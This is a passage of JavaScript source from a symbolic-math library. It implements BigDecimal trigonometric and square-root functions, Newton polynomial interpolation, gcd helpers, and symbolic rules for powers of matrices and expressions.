      if (k === 1 || k === 2) {
        sum = BigDecimal.unaryMinus(sum);
      }

      return k === 1 || k === 3 ? BigDecimal.multiply(a, sum) : sum;
    }

    BigDecimal.sin = tryToMakeCorrectlyRounded(0, function (x, rounding) {
      return _cos(x, rounding, true);
    }, "sin");
    BigDecimal.cos = tryToMakeCorrectlyRounded(0, function (x, rounding) {
      return _cos(x, rounding, false);
    }, "cos");
    BigDecimal.atan = tryToMakeCorrectlyRounded(0, function (x, rounding) {
      if (BigDecimal.greaterThan(BigDecimal.abs(x), BigDecimal.BigDecimal(1))) {
        //Note: rounding to maximumFractionDigits
        var internalRounding = {
          maximumFractionDigits: rounding.maximumSignificantDigits + 1,
          roundingMode: "half-even"
        };
        var halfOfPi = BigDecimal.multiply(BigDecimal.atan(BigDecimal.BigDecimal(1), internalRounding), BigDecimal.BigDecimal(2));
        return BigDecimal.multiply(BigDecimal.BigDecimal(BigDecimal.lessThan(x, BigDecimal.BigDecimal(0)) ? -1 : +1), BigDecimal.subtract(halfOfPi, BigDecimal.atan(BigDecimal.divide(BigDecimal.BigDecimal(1), BigDecimal.abs(x), internalRounding), internalRounding)));
      } // https://en.wikipedia.org/wiki/Inverse_trigonometric_functions#:~:text=Alternatively,%20this%20can%20be%20expressed%20as


      var internalRounding = {
        maximumSignificantDigits: rounding.maximumSignificantDigits + Math.ceil(Math.log2(rounding.maximumSignificantDigits + 0.5) / Math.log2(BASE)),
        roundingMode: "half-even"
      };
      var n = 0;
      var xx = BigDecimal.multiply(x, x);
      var xxplus1 = BigDecimal.add(BigDecimal.BigDecimal(1), xx);
      var term = BigDecimal.divide(BigDecimal.BigDecimal(1), xxplus1, internalRounding);
      var sum = term;
      var lastSum = BigDecimal.BigDecimal(0);

      while (!BigDecimal.equal(lastSum, sum)) {
        n += 1;
        term = BigDecimal.multiply(term, BigDecimal.multiply(BigDecimal.BigDecimal(2 * n), xx));
        term = BigDecimal.divide(term, BigDecimal.multiply(BigDecimal.BigDecimal(2 * n + 1), xxplus1), internalRounding);
        lastSum = sum;
        sum = BigDecimal.add(sum, term, internalRounding);
      }

      return BigDecimal.multiply(x, sum);
    }, "atan");

    BigDecimal.sqrt = function (x, rounding) {
      if (BigDecimal.lessThan(x, BigDecimal.BigDecimal(0))) {
        throw new RangeError();
      }

      if (BigDecimal.equal(x, BigDecimal.BigDecimal(0))) {
        return x;
      } // https://en.wikipedia.org/wiki/Nth_root#Using_Newton's_method


      var e = JSBI.divide(getCountOfDigits(x), JSBI.BigInt(2));
      var t = exponentiate(BASE, e);
      var y = BigDecimal.multiply(x, exponentiate(BASE, JSBI.unaryMinus(JSBI.multiply(JSBI.BigInt(2), e))));
      var k = Math.floor(Math.log2(Number.MAX_SAFE_INTEGER + 1) / Math.log2(BASE)) - 1;
      var xn = BigDecimal.toNumber(BigDecimal.round(BigDecimal.multiply(y, exponentiate(BASE, k)), {
        maximumFractionDigits: 0,
        roundingMode: "half-even"
      })) / Math.pow(BASE, k);
      var r = Math.sqrt(xn); //TODO: fix

      var resultSignificantDigits = 2 * (rounding.maximumSignificantDigits || rounding.maximumFractionDigits + Math.ceil(significandDigits(x) / 2) || 1);
      var result = BigDecimal.multiply(BigDecimal.BigDecimal(Math.sign(r) * Math.floor(Math.abs(r) * Math.pow(BASE, k) + 0.5)), exponentiate(BASE, -k));

      var iteration = function (result, internalRounding) {
        return BigDecimal.divide(BigDecimal.add(y, BigDecimal.multiply(result, result)), BigDecimal.multiply(BigDecimal.BigDecimal(2), result), internalRounding);
      };

      for (var i = Math.max(k - 1, 1); i <= resultSignificantDigits; i *= 2) {
        var internalRounding = {
          maximumSignificantDigits: i,
          roundingMode: "half-even"
        };
        result = iteration(result, internalRounding);
      }

      result = iteration(result, rounding);
      return BigDecimal.multiply(result, t);
    };

    return BigDecimal;
  };

  var BigDecimal = factory(10);
  var BigFloat = factory(2);
  self.BigDecimal = BigDecimal;
  self.BigFloat = BigFloat;
})();
(function () {
"use strict";

// Example:
// var N = NewtonInterpolation();
// N.next();
// console.log(N.next([1,1]).value); // y = 1
// console.log(N.next([2,4]).value); // y = 3x - 2
// console.log(N.next([3,9]).value); // y = x^2

var DefaultYField = {
  ONE: 1,
  sub: function (a, b) { return a - b; },
  mul: function (a, b) { return a * b; },
  div: function (a, b) { return a / b; },
  scale: function (a, s) { return a * Number(s); }
};

var yField = DefaultYField;

// An iterator which returns an updated Newton interpolation polynomial
// Polynomial is returned as an array of coefficients
function NewtonInterpolation() {
  var coefficients = function () {
    var x = [];
    var diagonal = []; // [y_k], [y_(k-1), y_k], ..., [y_0, y_1, ..., y_k]
    var equidistantly = true;
    var hInKTimeskFactorial = yField.ONE; // h**k * k!
    var c = yField.ONE;
    var firstTime = true;
    var iterator = {
      next: function (point) {
        while (true) {
          if (firstTime) {
            firstTime = false;
            return {value: c, done: false};
          }
          var $tmpxi_yi = point; var xi = $tmpxi_yi[0]; var yi = $tmpxi_yi[1];
          if (equidistantly && x.length >= 2 && x[x.length - 1] - x[x.length - 2] !== xi - x[x.length - 1]) {
            // https://en.wikipedia.org/wiki/Divided_differences#:~:text=The%20relationship%20between%20divided%20differences%20and%20forward%20differences%20is[4]
            var h = x[x.length - 1] - x[x.length - 2];
            hInKTimeskFactorial = yField.ONE;
            for (var k = 1; k < diagonal.length; k += 1) {
              hInKTimeskFactorial = yField.scale(hInKTimeskFactorial, h * k);
              diagonal[k] = yField.div(diagonal[k], hInKTimeskFactorial);
            }
            equidistantly = false;
          }
          var value = yi;
          for (var i = 0; i < diagonal.length; i += 1) {
            // https://en.wikipedia.org/wiki/Divided_differences#Example
            var difference = yField.sub(value, diagonal[i]);
            if (!equidistantly) {
              difference = yField.div(difference, yField.scale(yField.ONE, xi - x[x.length - 1 - i]));
            }
            diagonal[i] = value;
            value = difference;
          }
          diagonal.push(value);
          x.push(xi);
          c = diagonal[diagonal.length - 1];
          if (equidistantly && x.length >= 2) {
            var k = diagonal.length - 1;
            var h = x[x.length - 1] - x[x.length - 2];
            hInKTimeskFactorial = yField.scale(hInKTimeskFactorial, h * k);
            c = yField.div(c, hInKTimeskFactorial);
          }
          return {value: c, done: false};
        }
      }
    };
    iterator[globalThis.Symbol.iterator] = function () {
      return this;
    };
    return iterator;
  };
  var yZERO = yField.sub(yField.ONE, yField.ONE);
  var yONE = yField.ONE;
  var a = coefficients();
  a.next();
  // https://en.wikipedia.org/wiki/Newton_polynomial#Definition
  var basisPolynomial = [yONE]; // n_j(x)
  var N = [];
  var firstTime = true;
  var iterator = {
    next: function (point) {
      while (true) {
        if (firstTime) {
          firstTime = false;
          return {value: N, done: false};
        }
        var $tmpxi_yi = point; var xi = $tmpxi_yi[0]; var yi = $tmpxi_yi[1];
        var c = yField.sub(yZERO, a.next([xi, yi]).value);
        // N = N + c * basisPolynomial
        N.push(yZERO);
        for (var i = basisPolynomial.length - 1; i >= 0; i -= 1) {
          N[i] = yField.sub(N[i], yField.mul(basisPolynomial[i], c));
        }
        //console.log(N.join(" "));
        // basisPolynomial = basisPolynomial * (x - xi)
        basisPolynomial.push(yZERO);
        for (var i = basisPolynomial.length - 1; i >= 0; i -= 1) {
          basisPolynomial[i] = yField.sub(i >= 1 ? basisPolynomial[i - 1] : yZERO, yField.scale(basisPolynomial[i], xi));
        }
        return {value: N, done: false};
      }
    }
  };
  iterator[globalThis.Symbol.iterator] = function () {
    return this;
  };
  return iterator;
}

NewtonInterpolation.setField = function (newYField) {
  yField = newYField || DefaultYField;
};

globalThis.NewtonInterpolation = NewtonInterpolation;
self.NewtonInterpolation = NewtonInterpolation;

})();
(function () {
"use strict";
/*jslint plusplus: true, vars: true, indent: 2 */

// Thanks to Eduardo Cavazos
// see also https://github.com/dharmatech/Symbolism/blob/master/Symbolism/Symbolism.cs
// see also "Computer Algebra and Symbolic Computation: Elementary Algorithms" by Joel S. Cohen

// public API:
// Expression.prototype.add
// Expression.prototype.subtract
// Expression.prototype.multiply
// ...
// protected API:
// Expression.prototype.addExpression
// Expression.prototype.addInteger

  //
  
  
  
  
  

  
  

  function gcdOfSafeIntegers(a, b) {
    a = Math.abs(a);
    b = Math.abs(b);
    while (b !== 0) {
      var r = a - Math.floor(a / b) * b;
      a = b;
      b = r;
    }
    return a;
  }

  Math.gcd = function (a, b) {
    if (typeof a !== "number" &&
        typeof b !== "number") {
      throw new RangeError();
    }
    var maxSMI = 1073741823;
    if ((a | 0) === a && Math.abs(a) <= maxSMI &&
        (b | 0) === b && Math.abs(b) <= maxSMI) {
      var A = Math.abs(a);
      var B = Math.abs(b);
      while (B !== 0) {
        var R = A % B;
        A = B;
        B = R;
      }
      return A;
    }
    return gcdOfSafeIntegers(a, b);
  };
  
  function integerMin(a, b) {
    return a.compareTo(b) < 0 ? a : b;
  }

  function bigIntGCDWrapper2(a, b) {
    if (Math.abs(SmallBigInt.toNumber(a)) >= 1/0 && Math.abs(SmallBigInt.toNumber(b)) >= 1/0) {
      var size = integerMin(Expression.Integer.fromBigInt(a).abs(), Expression.Integer.fromBigInt(b).abs()).bitLength();
      size = Math.pow(2, Math.ceil(Math.log2(size)));
      if (size >= 128 * 1024) {
        if (size > lastMaxSize) {
          lastMaxSize = size;
          var error = new TypeError("big size of " + "gcd" + " " + size);
          if (globalThis.onerror != null) {
            globalThis.onerror(error.message, "", 0, 0, error);
          }
        }
      }
    }
    return bigIntGCD(SmallBigInt.BigInt(a), SmallBigInt.BigInt(b));
  }

  function bigIntGCDWrapper(a, b) {
    if (typeof a === "number" && typeof b === "number") {
      return Math.gcd(a, b);
    }
    return bigIntGCDWrapper2(a, b);
  }

  var pow = function (x, count, accumulator) {
    if (!(count >= 0)) {
      throw new RangeError();
    }
    if (count > Number.MAX_SAFE_INTEGER) {
      throw new RangeError("NotSupportedError");
    }
    return (count < 1 ? accumulator : (2 * Math.floor(count / 2) !== count ? pow(x, count - 1, accumulator.multiply(x)) : pow(x.multiply(x), Math.floor(count / 2), accumulator)));
  };

  // https://stackoverflow.com/a/15302448/839199
  var binomialCoefficient = function (n, k) { // binomail coefficient
    return k === 0 ? Expression.ONE : n.multiply(binomialCoefficient(n.subtract(Expression.ONE), k - 1)).divide(Integer.fromNumber(k));
  };

/*
  var powerOfJordanForm = function (J, N) {
    return J.map(function (e, i, j) {
      if (i > j) {
        return Expression.ZERO;
      }
      if (i === j) {
        return J.e(i, i).equals(Expression.ZERO) ? Expression.ZERO : J.e(i, i).pow(N);
      }
      if (J.e(i, i + 1).equals(Expression.ZERO)) {
        return Expression.ZERO;
      }
      var m = j - i;
      for (var k = 0; k < m; k += 1) {
        if (!J.e(j - 1 - k, j - k).equals(Expression.ONE)) { // outside of a block
          return Expression.ZERO;
        }
      }
      return J.e(i, i).equals(Expression.ZERO) ? Expression.ZERO : binomialCoefficient(N, m).multiply(J.e(i, i).pow(N.subtract(Expression.Integer.fromNumber(m))));
    });
  };
*/

  var matrixInN = function (matrix, n) {
    var condition = -1;
    /*
    if (matrix.isDiagonal()) {
      for (var i = 0; i < matrix.cols(); i += 1) {
        if (matrix.e(i, i).equals(Expression.ZERO)) {
          condition = 0;//?
        }
      }
      var result = matrix.map(function (e, i, j) {
        return i === j ? (e.equals(Expression.ZERO) ? Expression.ZERO : e.pow(n)) : Expression.ZERO;
      });
      var an = new Expression.Matrix(result);
      return condition !== -1 ? new ExpressionWithCondition(an, Condition.TRUE.andGreaterZero(n.subtract(Expression.Integer.fromNumber(condition)))) : an;
    }
    */
    /*
    if (matrix.isJordanMatrix()) {
      for (var i = 0; i < matrix.cols(); i += 1) {
        if (matrix.e(i, i).equals(Expression.ZERO)) {
          condition = Math.max(condition, 0);
          // should be Jordan block size minus one (?)
          for (var j = 0; i + j + 1 < matrix.cols(); j += 1) {
            if (matrix.e(i + j, i + j + 1).equals(Expression.ONE)) {
              condition = Math.max(condition, j + 1);
            }
          }
        }
      }
      var an = new Expression.Matrix(powerOfJordanForm(matrix, n));
      if (condition > 0) {//TODO: remove(merge)
        var cases = [];
        cases.push(new ExpressionWithCondition(an, Condition.TRUE.andGreaterZero(n.subtract(Integer.fromNumber(condition)))));
        for (var i = 1; i <= condition; i += 1) {
          cases.push(new ExpressionWithCondition(new Expression.Matrix(matrix.pow(i)), Condition.TRUE.andZero(n.subtract(Integer.fromNumber(i)))));
        }
        return new Expression.Cases(cases);
      }
      return condition !== -1 ? new ExpressionWithCondition(an, Condition.TRUE.andGreaterZero(n.subtract(Integer.fromNumber(condition)))) : an;
    }
    */
    //!
    var D = matrix.map(function (e, i, j) {
      return i === j ? e : Expression.ZERO;
    });
    var N = matrix.subtract(D);
    if (N.isNilpotent()) {//TODO: fix Matrix#isNilpotent
      if (D.multiply(N).eql(N.multiply(D))) {// D and N commute
        //Note: covers diagonal matrices and Jordan matrices
        for (var k = 0; k < D.cols(); k += 1) {
          if (D.e(k, k).equals(Expression.ZERO)) {
            var index = 1;
            while (!N.pow(index).map(function (e, i, j) { return i !== k ? Expression.ZERO : e; }).isZero()) {
              if (index >= N.cols()) {
                throw new TypeError("assertion");
              }
              index += 1;
            }
            condition = Math.max(condition, index - 1);//?
          }
        }
        var result = Matrix.Zero(N.cols(), N.cols());
        for (var k = 0; k < N.cols() && (k === 0 || !N.isZero()); k += 1) {
          var Dnmk = D.map(function (e, i, j) {
            return i === j ? (e.equals(Expression.ZERO) ? Expression.ZERO : e.pow(n.subtract(Expression.Integer.fromNumber(k)))) : Expression.ZERO;
          });
          result = result.add(Dnmk.multiply(N.pow(k)).scale(binomialCoefficient(n, k)));
        }
        var an = new Expression.Matrix(result);
        if (condition > 0) {//TODO: remove(merge)
          var cases = [];
          cases.push(new ExpressionWithCondition(an, Condition.TRUE.andGreaterZero(n.subtract(Integer.fromNumber(condition)))));
          for (var i = 1; i <= condition; i += 1) {
            cases.push(new ExpressionWithCondition(new Expression.Matrix(matrix.pow(i)), Condition.TRUE.andZero(n.subtract(Integer.fromNumber(i)))));
          }
          return new Expression.Cases(cases);
        }
        return condition !== -1 ? new ExpressionWithCondition(an, Condition.TRUE.andGreaterZero(n.subtract(Integer.fromNumber(condition)))) : an;
      }
    }
    //!
    var canExponentiate = function (k) {
      if (enableAN && k instanceof Expression.Symbol) {
        return true;
      }
      if (k instanceof Exponentiation && getBase(k) instanceof Integer && getBase(k).compareTo(Expression.ONE) > 0 && isIntegerOrN(getExponent(k).inverse())) {//TODO: remove (no need if to change other codes) of fix `isConstant`?
        return true;
      }
      return isConstant(k) || isConstant(k.divide(Expression.E));
    };
    //Note: experimental
    // {{1,0,0},{0,1,1},{0,0,1}}^n === {{1,0,0},{0,1,n},{0,0,1}}
    // A
    var a = matrix;
    // A^(n-1)
    var symbolName = "aa";
    var anm1 = matrix.map(function (e, i, j) {
      return new Expression.Symbol(symbolName + "_(" + i + "," + j + ")");
    });
    var anm1previous = anm1.map(function (e, i, j) {
      return Expression.ZERO;
    });
    var an = undefined;
    var iteration = -1;
    while (!anm1.eql(anm1previous)) {
      iteration += 1;
      anm1previous = anm1;
      // A^(n) = A^(n-1) * A;
      an = anm1.multiply(a);
      anm1 = an.map(function (e, i, j) {
        var isSymbol = anm1.e(i, j) instanceof Expression.Symbol && anm1.e(i, j).symbol.slice(0, symbolName.length) === symbolName;
        if (!isSymbol) {
          return anm1.e(i, j);//?
        }
        // an: {{1,0,0},{0,1,1+aa_23},{0,0,1}}
        // a_n = n + a_(n-1)
        // a_n = k * a_(n-1) + c * k**(n-(m+1)) * choose(n-1, m)
        // =>
        // a_n = c * k**(n-(m+1)) * choose(n, m+1)
        // Note: choose(n-1, m) + choose(n-2, m) + choose(n-3, m) + ... = choose(n, m+1)
        // choose(n-1, m+1) + choose(n-1, m) = choose(n, m+1)
        if (!(e instanceof Integer)) {
          var m = Polynomial.toPolynomial(e.getNumerator(), n).getDegree();
          var previous = anm1.e(i, j);
          var p = Polynomial.toPolynomial(e.getNumerator(), previous);
          var k = p.getLeadingCoefficient().divide(e.getDenominator());
          if (m !== 0 &&
              p.getDegree() === 1 &&
              a.e(i, j).equals(Expression.ZERO) && //TODO: remove
              (k instanceof Integer || k instanceof Expression.Complex || canExponentiate(k))) { //TODO: fix
            var f = k.pow(n).divide(k.pow(Integer.fromNumber(m + 1))).multiply(binomialCoefficient(n.subtract(Expression.ONE), m));
            var c = e.subtract(k.multiply(previous)).divide(f);
            //TODO: remove `k instanceof Integer`
            if (c instanceof Integer) {//?TODO: ?
              console.log("!", e.toString());
              // a.e(i, j).add()
              return c.multiply(k.pow(n).divide(k.pow(Integer.fromNumber(m + 2))).multiply(binomialCoefficient(n.subtract(Expression.ONE), m + 1)));
            }
          }
        }
        // a_n = a_(n-1)
        if (e.equals(anm1.e(i, j))) {
          return a.e(i, j);
        }
        // a_n = k * a_(n-1) + function (b) { return a_n = k**(n - 1) * a_1 + b * (1-k**(n-2))/(1-k); }
        if (anm1.e(i, j) instanceof Expression.Symbol && anm1.e(i, j).symbol === symbolName + "_(" + i + "," + j + ")" && !e.equals(Expression.ZERO)) {
          var previous = anm1.e(i, j);
          var p = Polynomial.toPolynomial(e.getNumerator(), previous);
          var k = p.getLeadingCoefficient().divide(e.getDenominator());
          var b = p.getCoefficient(0).divide(e.getDenominator());
          if (!Expression.has(b, Expression.Symbol) && //TODO: !!!
              e.equals(k.multiply(previous).add(b))) {
            var s = k.equals(Expression.ONE) ? b.multiply(n.subtract(Expression.TWO)) : b.multiply(Expression.ONE.subtract(k.pow(n.subtract(Expression.TWO))).divide(Expression.ONE.subtract(k)));
            return k.pow(n.subtract(Expression.TWO)).multiply(a.e(i, j)).add(s);
          }
        }
        if (anm1.e(i, j) instanceof Expression.Symbol && anm1.e(i, j).symbol === symbolName + "_(" + i + "," + j + ")" && e.equals(Expression.ZERO)) {
          //!TODO: conditions.push(iteration); //? n > 0 && n <= 3 , n > 3 - ?
          condition = iteration;
          return Expression.ZERO;
        }
        // a_n = a_(n-1) + function (b) { return a_n = a_1 + b*(n-1); }
        var sub = e.subtract(anm1.e(i, j));
        if (sub instanceof Integer) {
          return a.e(i, j).add(sub.multiply(n.subtract(Expression.TWO)));
        }
        var dpnm1pda = function (k) { // k**(n-1) + k * a_(n-1)
          if (!canExponentiate(k)) {//TODO: remove
            return Expression.ZERO;// cannot do k.pow(n)
          }
          var previous = anm1.e(i, j);
          return k.pow(n.subtract(Expression.ONE)).add(k.multiply(previous));
        };
        // a_n = d**(n-1) + d * a_(n-1)
        // a_n = d**(n-1) + d * a_(n-1) = 2 * d**(n-1) + d**2 * a_(n-2) = ... = n * d**(n-1) + d**n
        if (!e.equals(Expression.ZERO)) {
          var previous = anm1.e(i, j);
          var p = Polynomial.toPolynomial(e.getNumerator(), previous);
          var k = p.getLeadingCoefficient().divide(e.getDenominator());
          var d = k;
          if (e.equals(dpnm1pda(d))) {
            return d.pow(n.subtract(Expression.TWO)).multiply(n.subtract(Expression.TWO).add(a.e(i, j)));
          }
          var d = k.negate();
          if (e.equals(dpnm1pda(d))) {
            return d.pow(n.subtract(Expression.TWO)).multiply(n.subtract(Expression.TWO).add(a.e(i, j)));
          }
        }

        return anm1.e(i, j);
      });
    }
    for (var i = 0; i < anm1.rows(); i += 1) {
      for (var j = 0; j < anm1.cols(); j += 1) {
        var e = anm1.e(i, j);
        if (e instanceof Expression.Symbol && e.symbol.slice(0, symbolName.length) === symbolName) {
          return undefined;
        }
      }
    }
    if (condition > 0) {
      var cases = [];
      cases.push(new ExpressionWithCondition(new Expression.Matrix(an), Condition.TRUE.andGreaterZero(n.subtract(Integer.fromNumber(condition)))));
      for (var i = 1; i <= condition; i += 1) {
        cases.push(new ExpressionWithCondition(new Expression.Matrix(a.pow(i)), Condition.TRUE.andZero(n.subtract(Integer.fromNumber(i)))));
      }
      return new Expression.Cases(cases);
    }
    var e = new Expression.Matrix(an);
    return condition !== -1 ? new ExpressionWithCondition(e, Condition.TRUE.andGreaterZero(n.subtract(Integer.fromNumber(condition)))) : e;
  };

  var enableEX = true;
  var enable2X = true;
  var enableEC = true;
  var enableAN = true;

  var isPositiveQuick = function (x) {
    if (x instanceof Integer) {
      return x.compareTo(Expression.ZERO) > 0;
    }
    if (x instanceof NthRoot) {
      return isPositiveQuick(x.a);//?
    }
    if ((x instanceof Multiplication || x instanceof Division) && !x.a.equals(Expression.ONE.negate()) && !x.b.equals(Expression.ONE.negate())) {
      return (isPositiveQuick(x.a) && isPositiveQuick(x.b)) || (isPositiveQuick(x.a.negate()) && isPositiveQuick(x.b.negate()));//? bug - ?
    }
    if (x instanceof Addition) {
      return isPositiveQuick(x.a) && isPositiveQuick(x.b);
    }
    if (x instanceof Expression.PolynomialRootSymbol) {
      return isPositiveQuick(x.interval.a) && isPositiveQuick(x.interval.b);
    }
    if (x instanceof Expression.Multiplication && x.a.equals(Expression.ONE.negate()) && x.b instanceof Expression.PolynomialRootSymbol) {
      return !isPositiveQuick(x.b.interval.a) && !isPositiveQuick(x.b.interval.b);
    }
    //TODO: ?
    /*if (x instanceof Expression.ExpressionPolynomialRoot) {
      return isPositiveQuick(x.root.interval.a) && isPositiveQuick(x.root.interval.b);
    }
    if (x instanceof Expression.Multiplication && x.a.equals(Expression.ONE.negate()) && x.b instanceof Expression.ExpressionPolynomialRoot) {
      return !isPositiveQuick(x.b.root.interval.a) && !isPositiveQuick(x.b.root.interval.b);
    }
    if (x instanceof Expression.ExpressionWithPolynomialRoot) {
      return isPositiveQuick(x.e);
    }*/
    return false;
  };

  var isPositive = function (x) {
    if (x.equals(Expression.ZERO)) {
      return false;
    }
    if (isPositiveQuick(x)) {
      return true;
    }
    if (isPositiveQuick(x.negate())) {
      return false;
    }
    if (x instanceof Expression.Symbol && !(x instanceof Expression.PolynomialRootSymbol) && !(x instanceof Expression.ExpressionPolynomialRoot) && !(x instanceof Expression.ExpressionWithPolynomialRoot)) {
      if (x === Expression.PI || x === Expression.E) {
        return true;
      }
      return false;
    }
    if (x instanceof Expression.Complex) {
      return false;
    }
    if (Expression.has(x, Expression.Complex)) {//???
      return false;
    }
    //TODO:
    //if (x instanceof ExpressionPolynomialRoot) {
    //  var tmp = x.sign();
    //  return tmp > 0;
    //}
    if (x instanceof Addition || x instanceof Expression.Cos || x instanceof Expression.Sin || x instanceof Expression.Exponentiation || x instanceof Expression.Multiplication || x instanceof Expression.PolynomialRootSymbol || x instanceof Expression.ExpressionPolynomialRoot || x instanceof Expression.ExpressionWithPolynomialRoot || x instanceof Expression.Division) {
      var tmp = toDecimalStringInternal(x, {significantDigits: 1});
      var value = tmp == undefined ? 0/0 : Number(tmp.replace(/\((\d+)\)/g, '$1').replace(/\*10\^/g, 'e'));
      if (!Number.isNaN(value)) {
        return value > 0;
      }
    }
    if (x instanceof Expression.ExponentiationOfMinusOne) {
      return false;
    }
    if (x instanceof Expression.Exponentiation && getExponent(x) instanceof Expression.Integer) {
      return isPositive(x.a); // x**2
    }
    if (Expression.has(x, Expression.Symbol)) {
      return false;//?
    }
    //TODO: tests, fix for algebraic numbers (?)
    if (x instanceof Expression.Logarithm) {
      return isPositive(x.a.subtract(Expression.ONE));
    }
    throw new TypeError("!" + x);
  };

  Expression._isPositive = isPositive;




  var isIntegerOrN = function (e) {
    if (e instanceof Integer) {
      return true;
    }
    if (e instanceof Expression.Symbol && (e.symbol === "n" || e.symbol === "k")) {
      return true;
    }
    if (e instanceof Expression.Addition || e instanceof Expression.Multiplication || e instanceof Expression.Exponentiation) {
      return isIntegerOrN(e.a) && isIntegerOrN(e.b);
    }
    //TODO: factorial - ?
    //TODO: n*(n+1)/2
    return false;
  };

  var isGoodPolynomial = function (x) {
    if (x instanceof Expression.Exponentiation) {
      return false;
    }
    var v = getVariableInternal(getLastMultiplicationOperand(getFirstAdditionOperand(x))).next().value.v; // avoid square roots
    if (v instanceof Expression.Symbol) {
      var p = Polynomial.toPolynomial(x, v);
      if (p.getDegree() === 1 && p.getCoefficient(0) instanceof Expression.Integer && p.getCoefficient(1) instanceof Expression.Integer) {
        if (p.getContent().equals(Expression.ONE)) {
          return true;
        }
      }
    }
    return false;
  };

  var isMatrixSymbolTranspose = function (e) {
    if (e instanceof Expression.Exponentiation) {
      if (getBase(e) instanceof Expression.MatrixSymbol) {
        var exp = getExponent(e);
        if (exp instanceof Expression.Symbol && exp.symbol === "T") {
          return true;
        }
        if (exp instanceof Expression.Multiplication && exp.a instanceof Expression.Integer && exp.b instanceof Expression.Symbol && exp.b.symbol === "T") {
          return true;
        }
      }
    }
    return false;
  };

  Expression.prototype.powExpression = function (x) {
    var y = this;
    
    if (y === Expression.INFINITY) {
      if (Expression.isReal(x)) {
        if (x.compareTo(Expression.ONE) > 0) {
          //TODO: !? more arithmetic support for infinities (?)
          //return Expression.INFINITY;
          throw new RangeError("NotSupportedError");
        }
        if (x.compareTo(Expression.ONE) === 0) {
          return Expression.ONE;
        }
        if (x.compareTo(Expression.ONE.negate()) > 0) {
          return Expression.ZERO;
        }
        throw new RangeError("NotSupportedError");
      }
      var tmp = Expression.getComplexNumberParts(x);
      if (Expression.isReal(tmp.real) && Expression.isReal(tmp.imaginary)) {
        var rhorho = tmp.real._pow(2).add(tmp.imaginary._pow(2));
        if (rhorho.compareTo(Expression.ONE) < 0) {
          return Expression.ZERO;
        }
      }
    }

    if (y instanceof Expression.Symbol && (y.symbol === "t" || y.symbol === "T")) {
      if (Expression.has(x, MatrixSymbol) || Expression.has(x, Expression.Matrix)) {//TODO: fix
        return x.transpose();
      }
    }
    if (y instanceof Expression.Multiplication && y.a instanceof Expression.Integer && y.b instanceof Expression.Symbol && (y.b.symbol === "t" || y.b.symbol === "T")) {
      if (Expression.has(x, MatrixSymbol) || Expression.has(x, Expression.Matrix)) {//TODO: fix
        return x.pow(y.a).transpose();
      }
    }

    //!
    if (y instanceof Division && y.a instanceof Integer && y.b instanceof Integer && x !== Expression.E && !(x instanceof Expression.Symbol) && !Expression.has(x, Expression.Symbol)) {
      if (typeof hit === "function") {
        hit({powExpression: y.toString()});
      }
      var n = y.b.toNumber();
      //if (n >= 2 && n <= Number.MAX_SAFE_INTEGER) {//TODO:
        var q = y.a.truncatingDivide(y.b);
        var r = y.a.subtract(q.multiply(y.b));
        if (q.equals(Expression.ZERO)) {// to avoid multiplication event
          return x.pow(r)._nthRoot(n);
        }
        return x.pow(q).multiply(x.pow(r)._nthRoot(n));
      //}
    }
    //!

    if (x instanceof Expression.Integer && y === Expression.CIRCLE) {
      return new Expression.Degrees(x);
    }

    //!new 2017-05-08
    if (enableEX) {
      if (x === Expression.E || (enable2X && x instanceof Integer && x.compareTo(Expression.ONE) > 0 && integerPrimeFactor(x).compareTo(x) === 0)) {
        var isValid = function (y) {
          if (y instanceof Expression.Symbol) {
            return true;
          }
          if (y instanceof Addition) {
            return isValid(y.a) && isValid(y.b);
          }
          if ((y instanceof Integer || y instanceof NthRoot) && (x === Expression.E || (x instanceof Integer && y instanceof NthRoot))) {//TODO: fix
            return true;
          }
          if (y instanceof Multiplication || y instanceof Exponentiation) {
            for (var iteratorf = y.factors()[globalThis.Symbol.iterator](), f = iteratorf.next().value; f != null; f = iteratorf.next().value) {
              var b = getBase(f);
              if (!(b instanceof Integer || b instanceof NthRoot || b instanceof Expression.Symbol)) {
                if (!isValid(b)) {
                  return false;
                }
              }
            }
            return true;
          }
          if ((x === Expression.E || x instanceof Integer && x.compareTo(Expression.ONE) > 0) && y instanceof Division && y.b instanceof Integer) {//!new 2019-08-08
            return isValid(y.a);//?
          }
          return false;
        };
        if (y.getNumerator() instanceof Addition && (y.getNumerator().a.isNegative() || y.getNumerator().b.isNegative())) { // e**(x-y)
          return Expression.ONE.divide(x.pow(y.getNumerator().a.negate().divide(y.getDenominator())).divide(x.pow(y.getNumerator().b.divide(y.getDenominator()))));
        }
        if (isValid(y)) {
          if (y.isNegative()) {
            return Expression.ONE.divide(new Expression.Exponentiation(x, y.negate()));
          }
          //!new
          if (y instanceof Expression.ExpressionWithPolynomialRoot) {
            return x.pow(y.upgrade());
          }
          return new Expression.Exponentiation(x, y);
        }
      }
      if (enable2X && x instanceof Integer && x.compareTo(Expression.ONE) > 0) {
        if (y instanceof Addition && (y.a instanceof Integer || y.b instanceof Integer)) {
          return x.pow(y.a).multiply(x.pow(y.b));
        }
        var xf = integerPrimeFactor(x);
        if (xf.equals(x)) {
          if (y instanceof Division && y.b instanceof Integer) {
            var n = y.b.toNumber();
            if (n >= 2 && n <= Number.MAX_SAFE_INTEGER) {
              return x.pow(y.a)._nthRoot(n);
            }
          }
          //!new 2020-18-01
          if (y instanceof Division && isIntegerOrN(y.a) && isIntegerOrN(y.b)) {
            if (x.compareTo(Expression.ONE) > 0) {
              return new Expression.Exponentiation(x, y);//?
            }
          }
          //!
        } else {
          if (!Expression.has(y, Expression.Logarithm)) {//TODO: ?
          var ctz = primeFactor._countTrailingZeros(x.toBigInt(), xf.toBigInt());
          return xf.pow(y.multiply(Integer.fromNumber(ctz))).multiply(x.divide(xf._pow(ctz)).pow(y));
          }
        }
      }
    }
    //!

    if (enableEX) {
      //TODO: - ?
      if (x instanceof Integer && x.equals(Expression.ONE)) {
        return Expression.ONE;
      }
      if (x instanceof Division || x instanceof Multiplication && (y.getDenominator().equals(Expression.ONE) || isPositive(x.a) || isPositive(x.b))) {
        if (x instanceof Division) {
          return x.a.pow(y).divide(x.b.pow(y));
        }
        if (enable2X) {
          if (x instanceof Multiplication) {
            return x.a.pow(y).multiply(x.b.pow(y));
          }
        }
      }
    }

    var yn = y.getNumerator();
    var yd = y.getDenominator();
    if (x === Expression.E && yn instanceof Multiplication && yn.a instanceof Expression.Complex && yn.a.real.equals(Expression.ZERO) && yn.b instanceof Expression.Symbol) {
      var t = y.multiply(Expression.I.negate());
      return t.cos().add(Expression.I.multiply(t.sin()));
    }
